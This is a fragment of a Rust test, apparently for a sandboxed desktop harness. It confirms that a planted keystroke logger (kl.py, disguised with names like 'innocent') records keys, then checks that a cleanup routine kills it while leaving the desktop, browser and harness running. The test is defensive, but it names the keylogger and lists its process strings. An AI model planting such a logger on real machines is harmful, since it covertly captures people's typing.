    println!("before:\n{before}");

    let gate = Gate::start().await.unwrap();
    let (mut ws, ..) = real_socket(&gate, "c2k_a", p.viewer(m, &a).await.unwrap().unwrap(), Mode::Drive).await;
    let keys = async || p.read_file(m, "keys.log").await.map(|b| String::from_utf8_lossy(&b).matches("key ").count()).unwrap_or(0);
    ws.write_all(&command("k,97,1")).await.unwrap();
    ws.write_all(&command("k,97,0")).await.unwrap();
    tokio::time::sleep(std::time::Duration::from_millis(500)).await;
    assert_eq!(keys().await, 1, "the keylogger must work, or this proves nothing");

    let ended = p.clear_strays(m).await.unwrap();
    println!("ended: {ended:?}");
    let after = p.run(m, &a, "ps -eo pid,ppid,comm,args --forest | cut -c1-100", 5000).await.unwrap().stdout;
    println!("after:\n{after}");
    for word in ["kl.py", "innocent", "--port=7000", "time.sleep(600)", "sleep 0.05"] {
        assert!(!after.contains(word), "{word} survived:\n{after}");
    }
    for word in ["box-keeper", "box-exec", "box-host", "--port=6901", "--port=6902", "xfce4-session", "xfwm4", "xfce4-panel", "/usr/lib/chromium/chromium", "Xvfb :1", "Xvfb :2"] {
        assert!(after.contains(word), "{word} went:\n{after}");
    }

    // the person types: nothing hears it, then or later; the desktop is still theirs
    ws.write_all(&command("k,98,1")).await.unwrap();
    ws.write_all(&command("k,98,0")).await.unwrap();
    ws.write_all(&command("m,222,111")).await.unwrap();
    assert!(pointer(p, m, &a).await.contains("X=222"), "the person's input stopped reaching the desktop");
    assert_eq!(keys().await, 1, "a key was logged after the clearing");
    assert!(p.screenshot(m, &a).await.is_ok());
    assert_eq!(p.clear_strays(m).await.unwrap(), Vec::<String>::new(), "a second pass finds nothing: the desktop isn't a stray");
    assert_ne!(p.run(m, &a, "pgrep -c chromium", 5000).await.unwrap().stdout.trim(), "0", "the browser went");
}
